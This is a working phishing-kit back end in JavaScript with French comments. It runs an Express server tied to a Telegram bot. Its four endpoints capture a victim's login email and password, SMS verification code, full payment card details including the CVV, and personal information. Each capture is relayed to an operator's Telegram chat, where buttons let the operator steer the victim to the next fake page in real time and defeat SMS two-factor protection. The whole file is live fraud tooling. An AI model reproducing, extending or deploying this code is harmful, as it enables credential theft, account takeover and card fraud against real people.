require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const { bot, ADMIN_CHAT_ID, saveHistory } = require('./bot');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

bot.startPolling();
console.log("🤖 Bot démarré");

// ================================================
// MÉMOIRE — sessions et décisions
// ================================================
const sessions = {};    // données de chaque utilisateur
const decisions = {};   // décision admin: 'step2','step3','step4','error','success'

// ================================================
// Boutons de décision admin pour chaque étape
// ================================================
function getDecisionButtons(sessionId, etape) {
  if (etape === 1) {
    return {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "➡️ Étape 2 (SMS)", callback_data: `go_step2_${sessionId}` },
            { text: "➡️ Étape 3 (Carte)", callback_data: `go_step3_${sessionId}` }
          ],
          [
            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` },
            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
          ]
        ]
      }
    };
  }
  if (etape === 2) {
    return {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "➡️ Étape 3 (Carte)", callback_data: `go_step3_${sessionId}` },
            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` }
          ],
          [
            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
          ]
        ]
      }
    };
  }
  if (etape === 3) {
    return {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "➡️ Étape 4 (Infos)", callback_data: `go_step4_${sessionId}` },
            { text: "✅ Succès", callback_data: `go_success_${sessionId}` }
          ],
          [
            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
          ]
        ]
      }
    };
  }
  if (etape === 4) {
    return {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Succès", callback_data: `go_success_${sessionId}` },
            { text: "❌ Erreur", callback_data: `go_error_${sessionId}` }
          ]
        ]
      }
    };
  }
}

// ================================================
// ÉTAPE 1 — Email + Mot de passe
// ================================================
app.post('/etape1', async (req, res) => {
  try {
    const { email, password } = req.body;
    const sessionId = uuidv4();

    sessions[sessionId] = { email, password, etape: 1 };
    decisions[sessionId] = null;

    saveHistory({ etape: 1, email, password, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `🔐 ÉTAPE 1 - Connexion\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId, 1)
    );

    res.json({ success: true, sessionId });

  } catch (error) {
    console.error('❌ Erreur étape 1:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 2 — Code SMS
// ================================================
app.post('/etape2', async (req, res) => {
  try {
    const { smsCode, sessionId } = req.body;

    if (sessions[sessionId]) sessions[sessionId].smsCode = smsCode;
    decisions[sessionId] = null;

    saveHistory({ etape: 2, smsCode, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `📱 ÉTAPE 2 - Code SMS\n🔢 Code: ${smsCode}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId, 2)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 2:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 3 — Carte bancaire
// ================================================
app.post('/etape3', async (req, res) => {
  try {
    const { cardName, cardNumber, expiry, cvv, cardBrand, sessionId } = req.body;

    if (sessions[sessionId]) {
      Object.assign(sessions[sessionId], { cardName, cardNumber, expiry, cvv, cardBrand, etape: 3 });
    }
    decisions[sessionId] = null;

    saveHistory({ etape: 3, cardName, cardNumber, expiry, cvv, cardBrand, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `💳 ÉTAPE 3 - Carte\n🏦 Marque: ${cardBrand}\n👤 Nom: ${cardName}\n💳 Numéro: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId, 3)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 3:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 4 — Infos personnelles
// ================================================
app.post('/etape4', async (req, res) => {
  try {
    const { firstName, lastName, address, birthYear, postalCode, sessionId } = req.body;

    if (sessions[sessionId]) {
      Object.assign(sessions[sessionId], { firstName, lastName, address, birthYear, postalCode, etape: 4 });
    }
    decisions[sessionId] = null;

    saveHistory({ etape: 4, firstName, lastName, address, birthYear, postalCode, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `👤 ÉTAPE 4 - Infos\n👤 Prénom: ${firstName}\n👤 Nom: ${lastName}\n🏠 Adresse: ${address}\n🎂 Naissance: ${birthYear}\n📮 Code postal: ${postalCode}\n\n👇 Que faire ?`,
      getDecisionButtons(sessionId, 4)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 4:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// DÉCISION — Le site interroge cette route toutes les 2s
// ================================================
app.get('/decision/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const decision = decisions[sessionId];

  if (decision) {
    decisions[sessionId] = null; // Reset après lecture
    res.json({ decision });
  } else {
    res.json({ decision: null });
  }
});

// ================================================
// CALLBACK BOT — Admin clique sur un bouton Telegram
// ================================================
bot.on('callback_query', async (query) => {
  const data = query.data;

  if (data.startsWith('go_')) {
    const withoutGo = data.slice(3);              // "step2_SESSION_ID"
    const underscoreIndex = withoutGo.indexOf('_');
    const action = withoutGo.slice(0, underscoreIndex);       // "step2"
    const sessionId = withoutGo.slice(underscoreIndex + 1);   // "SESSION_ID"

    decisions[sessionId] = action;

    await bot.answerCallbackQuery(query.id, { text: `✅ Décision: ${action}` });

    // Supprime les boutons du message Telegram
    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: query.message.chat.id, message_id: query.message.message_id }
    );

    await bot.sendMessage(ADMIN_CHAT_ID, `✅ Décision envoyée → ${action}`);
  }
});

app.listen(3000, () => {
  console.log('🚀 Serveur démarré sur http://localhost:3000');
});
